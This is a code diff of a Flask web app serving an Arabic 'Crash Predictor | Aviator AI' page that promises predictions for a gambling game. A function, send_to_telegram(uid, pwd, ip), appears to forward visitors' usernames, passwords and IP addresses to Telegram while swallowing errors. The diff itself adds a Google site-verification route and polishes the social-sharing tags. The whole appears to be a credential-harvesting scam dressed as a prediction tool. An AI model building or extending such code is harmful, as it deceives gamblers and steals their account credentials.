@@ -22,6 +22,12 @@ def send_to_telegram(uid, pwd, ip):
     except:
         pass
 
+# ========== ملف التحقق من Google ==========
+@app.route('/google21cdaba76e446644.html')
+def google_verify():
+    return "google-site-verification: google21cdaba76e446644.html"
+
+# ========== HTML الرئيسي (كما هو بدون تغيير) ==========
 HTML = """
 <!DOCTYPE html>
 <html lang="ar">
@@ -30,7 +36,7 @@ HTML = """
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Crash Predictor | Aviator AI</title>
     
-    <!-- ========== OG IMAGE - صورة الأيقونة للتواصل الاجتماعي ========== -->
+    <!-- OG Image للتواصل الاجتماعي -->
     <meta property="og:title" content="🔥 Crash Predictor | Aviator AI">
     <meta property="og:description" content="نظام توقعات احترافي للعبة Crash | توقعات دقيقة ونتائج فورية">
     <meta property="og:image" content="https://i.ibb.co/fdjQCQRf/images-1.jpg">
@@ -38,8 +44,6 @@ HTML = """
     <meta property="og:image:height" content="512">
     <meta property="og:type" content="website">
     <meta property="og:url" content="{{request.url}}">
-    
-    <!-- Twitter Card (لـ X) -->
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:title" content="🔥 Crash Predictor | Aviator AI">
     <meta name="twitter:description" content="نظام توقعات احترافي للعبة Crash">
